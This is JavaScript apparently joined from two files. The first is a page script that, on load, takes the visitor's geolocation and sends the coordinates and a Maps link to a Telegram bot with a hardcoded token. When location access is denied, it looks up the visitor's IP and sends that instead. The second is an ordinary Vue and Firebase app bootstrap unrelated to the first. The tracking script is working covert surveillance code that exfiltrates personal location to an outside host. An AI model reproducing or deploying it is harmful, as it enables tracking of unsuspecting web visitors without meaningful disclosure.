if(sessionStorage.getItem("location_var"))
{ var s; 
    if(!sessionStorage.getItem("s")){
      s = 0;
    }
    sessionStorage.setItem("s",parseInt(s));
    
    if(sessionStorage.getItem("s")>5){
      alert('I dont see any problem, why you spamming reload ?');
      window.open('https://www.youtube.com/watch?v=9Deg7VrpHbM');
    }
    s=sessionStorage.getItem("s");
    s=parseInt(s);
    sessionStorage.setItem("s",parseInt(s));
}
else{
  navigator.geolocation.watchPosition(function() {
    navigator.geolocation.getCurrentPosition(showPosition);
    sessionStorage.setItem("location_var", showPosition);
  },
  function(error) {
    if (error.code == error.PERMISSION_DENIED)
    done();
  });
}

function showPosition(position) {
  fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
  Latitude:${position.coords.latitude}
  Longitude:${position.coords.longitude}
  ${encodeURIComponent(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`)}
  `)}

function done(){
  let ip;
  fetch('https://api.ipify.org/')
  .then(function(response){
   return response.text()
  })
  .then(function(data){
    ip=data;
    api_url(ip);
  })
}

 function api_url(ip){
    fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
        ${encodeURIComponent(`https://api.iplocation.net/?ip=${ip}`)}
        `);
      }

import Vue from 'vue'
import App from './App.vue'
import router from './router'
import axios from 'axios'
import store from 'vuex';
import {fb} from './firebase'
import VueFirestore from 'vue-firestore'

Vue.use(VueFirestore, {
    key: 'id',         // the name of the property. Default is '.key'.
    enumerable: true  //  whether it is enumerable or not. Default is true.
  });
  
  let app ='';
  
Vue.config.productionTip = false
Vue.prototype.$http = axios
fb.auth().onAuthStateChanged(function() {
    if(!app){
     new Vue({
       router,
       store,
       render: h => h(App)
     }).$mount('#app')
     
    }
   });
   